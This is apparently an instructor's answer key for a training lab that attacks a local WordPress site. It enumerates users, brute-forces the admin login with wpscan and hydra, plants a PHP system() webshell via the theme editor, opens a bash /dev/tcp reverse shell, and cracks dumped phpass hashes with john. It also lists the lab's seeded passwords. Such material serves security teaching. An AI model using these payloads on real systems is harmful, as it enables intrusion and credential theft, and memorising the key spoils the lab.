# Solution — 02 Brightwave Media (easy, webapp set)

> Spoilers — instructor's answer key.

## Surface

A stock WordPress 6 site. `GET /` is the blog; `GET /wp-login.php` is the login form;
`/wp-admin/` is the dashboard once authenticated. `GET /wp-json/wp/v2/users` and the author
archives (`/?author=1`) enumerate usernames — `admin` is user 1, `editor` is user 2. MariaDB
(`db.brightwave.lab`) sits on the network holding the `wordpress` database.

```sh
wpscan --url http://127.0.0.1:8502 --enumerate u    # -> admin, editor
curl -s 'http://127.0.0.1:8502/wp-json/wp/v2/users' # same, via REST
```

## Intended chain

### Vector B — wordlist brute the admin login

The admin password is wordlist-weak. The lab ships `wordlist.txt` with the real password
(`sunshine2023`) seeded among decoys. `wp-login.php` accepts it — there is no lockout.

```sh
# wpscan (clean, WP-aware):
wpscan --url http://127.0.0.1:8502 \
  --usernames admin --passwords wordlist.txt --max-threads 5
# -> [SUCCESS] admin / sunshine2023

# hydra (raw POST form) does the same:
hydra -l admin -P wordlist.txt 127.0.0.1 -s 8502 \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Incorrect"
```

Log in at `http://127.0.0.1:8502/wp-login.php` as `admin:sunshine2023`.

### Vector J — authenticated editor → PHP webshell → reverse shell

`DISALLOW_FILE_EDIT` is not set, so an admin keeps the in-dashboard file editors. Write PHP
into a theme (or plugin) file and request it to get RCE.

1. **Appearance → Theme File Editor** (or **Plugins → Plugin File Editor**). Pick the active
   theme and edit a file, e.g. `404.php` or `functions.php` of `twentytwentyfour`. Append:
   ```php
   <?php if (isset($_GET['c'])) { system($_GET['c']); } ?>
   ```
   Click **Update File**.
2. Trigger it. A theme file lives under `/wp-content/themes/<theme>/`:
   ```sh
   curl 'http://127.0.0.1:8502/wp-content/themes/twentytwentyfour/404.php?c=id'
   # uid=33(www-data) ...
   ```
3. **Reverse shell** — start a listener, then drive the webshell:
   ```sh
   nc -lvnp 4444                           # attacker box
   curl 'http://127.0.0.1:8502/wp-content/themes/twentytwentyfour/404.php' \
     --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/10.20.2.1/4444 0>&1"' -G
   ```
   You land as `www-data` in the `skuggi-webapp-02-app` container — code execution on the host
   behind the site. (Cleaner alternative: upload a malicious plugin zip via **Plugins → Add
   New → Upload Plugin** with a PHP payload in the plugin header file.)

### Vector E — dump wp_users and crack the phpass hashes offline

WordPress 6.5 stores **phpass portable hashes** (`$P$B…`) in `wp_users.user_pass`. Dumping and
cracking them offline recovers the same weak passwords — a standalone credential finding that
does not need the login above.

```sh
# From a DB foothold (or the planted oracle), pull user + hash:
mariadb -uroot -proot-brightwave-2024 wordpress -N \
  -e "SELECT user_login,user_pass FROM wp_users"
# admin   $P$B....
# editor  $P$B....

# Crack with john (phpass format), in-lab wordlist:
printf 'admin:%s\neditor:%s\n' '<admin $P$ hash>' '<editor $P$ hash>' > hashes.txt
john --format=phpass --wordlist=wordlist.txt hashes.txt
# admin  -> sunshine2023
# editor -> chocolate
```

`admin:sunshine2023` and `editor:chocolate` are both valid logins — the admin hash cracks to
the very password that logs into `/wp-admin/`, closing the loop with Vector B.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `admin-email` | `admin@brightwave.lab` | MariaDB `wp_users.user_email` |
| `phpass-hashes` | `$P$` prefix (random salt per boot) | MariaDB `wp_users.user_pass` |
| `wpconfig-db-password` | `wp-db-brightwave-2024` | `app:/var/www/html/wp-config.php` |

Credentials: `admin:sunshine2023` (administrator), `editor:chocolate` (editor). Both passwords
live in `wordlist.txt` among decoys; MariaDB root is `root-brightwave-2024`; the WP DB account
is `wordpress:wp-db-brightwave-2024`.

> The phpass hashes are randomly salted at install, so their **values** change every boot —
> that is why the loot oracle fingerprints the `$P$` prefix, not a hash. The crack still works
> every boot because the plaintext (`sunshine2023` / `chocolate`) is fixed and shipped in
> `wordlist.txt`.

## Reset

`make lab-restore LAB=02-easy-wordpress` (recreate — drops the MariaDB + web-root volumes, the
init container re-installs WordPress and re-seeds users and the post on first boot).
